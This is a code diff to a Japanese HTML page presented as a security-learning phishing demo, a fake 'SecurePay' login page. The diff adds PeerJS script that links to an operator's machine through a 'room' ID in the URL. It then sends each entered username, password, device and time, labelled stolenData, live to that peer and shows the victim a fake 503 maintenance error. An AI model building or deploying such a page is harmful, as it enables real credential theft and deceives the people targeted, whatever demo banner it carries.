@@ -5,17 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ログイン | セキュリティ確認（デモ）</title>
   <link rel="stylesheet" href="style.css">
+  <!-- PeerJSの読み込み -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body class="victim-body">
   
-  <!-- 赤く大きく目立つ警告テロップ -->
   <div class="demo-warning">
-    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです実際の情報やパスワードは入力しないでください。
+    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。実際の情報やパスワードは入力しないでください。
   </div>
 
   <div class="login-container" id="login-box">
-    
-    <!-- CSSで作った架空のロゴ -->
     <div class="mock-logo">
       <span class="logo-icon">🛡️ S</span>
       <span>SecurePay</span>
@@ -35,9 +34,9 @@
       </div>
       <button type="submit" class="btn-primary">ログイン</button>
     </form>
+    <div style="margin-top: 15px; font-size: 11px; color: #888;" id="conn-status">PC管理者との接続待機中...</div>
   </div>
 
-  <!-- 送信後の偽エラー画面 -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
@@ -45,6 +44,27 @@
   </div>
 
   <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const hostId = urlParams.get('room'); // PC側のルームIDを取得
+
+    let peer = new Peer();
+    let conn = null;
+
+    peer.on('open', () => {
+      if (hostId) {
+        document.getElementById('conn-status').innerText = "PCへ接続中...";
+        // PC（ホスト）に接続を確立する
+        conn = peer.connect("sec-demo-" + hostId, { reliable: true });
+        
+        conn.on('open', () => {
+          document.getElementById('conn-status').innerText = "接続完了（リアルタイム送信可能）";
+          document.getElementById('conn-status').style.color = "#2ed573";
+        });
+      } else {
+        document.getElementById('conn-status').innerText = "⚠️ 接続先IDがありません（QRコード等からアクセスしてください）";
+      }
+    });
+
     function getDeviceInfo() {
       const ua = navigator.userAgent;
       if (ua.includes("iPhone")) return "iPhone (iOS)";
@@ -63,12 +83,16 @@
       const device = getDeviceInfo();
       const time = new Date().toLocaleTimeString();
 
-      const newData = { time, device, username, password };
+      const stolenData = { time, device, username, password };
 
-      let logs = JSON.parse(localStorage.getItem('stolen_logs') || '[]');
-      logs.unshift(newData);
-      localStorage.setItem('stolen_logs', JSON.stringify(logs));
+      // PC（管理者画面）へダイレクトにデータを送信！
+      if (conn && conn.open) {
+        conn.send(stolenData);
+      } else {
+        alert("PCとの接続が確立されていません。");
+      }
 
+      // 被害者にはメンテナンスエラー画面を表示
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
     });
